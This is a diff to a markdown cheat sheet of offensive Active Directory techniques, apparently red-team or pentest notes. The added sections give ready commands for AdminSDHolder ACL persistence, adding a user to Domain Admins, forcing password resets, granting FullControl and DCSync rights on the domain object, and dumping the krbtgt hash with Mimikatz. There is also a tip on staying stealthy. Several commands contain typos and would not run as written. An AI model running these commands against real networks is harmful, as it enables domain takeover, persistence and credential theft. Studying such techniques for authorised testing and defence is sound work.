@@ -220,7 +220,7 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 
 **mimilib.dll can be edited that the output is written in any directory e.g. SYSVOL or similar**
 
-## 🔑Persistence using ACLs - AdminSDHolder
+## 🔑ACLs - AdminSDHolder
 
 ### Description
 
@@ -250,13 +250,75 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
 Using ActiveDirectory Moduel and Set-ADACL:\
 Set-ADACL -DistinguisedName 'CN=AdminSDHolder,CN=System,DC=subdom,DC=dom,DC=local' -Principal yourusername -verbose
 
-&#x20;
+Do the propagtion:\
+$sess = NewPsSession -computername dchostn.local\
+Invoke-Command -filepath .\Invoke-SDPropagator.ps -sessoin $sess\
+Enter-pssession -sesion $sess\
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+
+**Get ACL of an Object for a specific user**\
+****. .\PowerView.ps1\
+Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ?{$\_.IdentityReference -atch 'username'}\
+\==> ActiveDirectoryRights: GenericAll => so you have full rights to domain
+
+Using AD Module\
+(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=subdom,DC=dom,DC=local').Access | ?{$\_.IdentityReference -match 'username'}&#x20;
+
+**Add Member to Domain Group**\
+. .\PowerView\_dev.ps1\
+Add-DomainGroupMember -identity 'domain admins' -members yourusername -verbose
+
+Using AD Module\
+Add-ADGroupMember -identity 'domain admins' -members yourusername -verbose
+
+**ResetPassword using PowerView\_dev**\
+Set-DomainUserPassword -identity yourusername -accountpassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose\
+\
+Using AD Module\
+Set-ADAccountPassword -Identity yourusername -newPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
 
 **Run SDpropgator to apply the AdminSDHolder on all the Protected Groups**\
 ****. .\Invoke-SDPropagator\
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
+❗Remember to add your user to other protected groups to be stealthier
+
+## 🔑ACL - Right Abuse / DCSync&#x20;
+
+### Description
+
+* ACL of the domain root itself to be modifed to provide rights like FullControl or "DCSync"
+* Default logging for modifications on the domain object itself is enabled
+
+### Requirement
+
+* DA permissions required
+
+### Tools
+
+**Add FullControl rights to Domain Object**\
+Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights All -verbose
+
+Using AD Module\
+Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -verbose
+
+**Add DCSync rights**\
+****Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights DCSync -verbose
+
+Using AD Module\
+Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -GUIDRight DCSync -verbose
+
+In the GUI they are called Replicating Directory Changes, Replicating Direcotry Changes All, Replicating Directory Changes In Filtered Set => All three are needed for DCSync
+
+DCSync in general very interesting because no commands need to be excuted on the DC itself after the initial attack
+
+Execute DCSync\
+Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'\
+\=> Other accounts such as dom\Administrator etc. or any other user who have DCSync rights
+
+## 🔑ACLs - Security Descriptors
 
 
-****
+
+
 
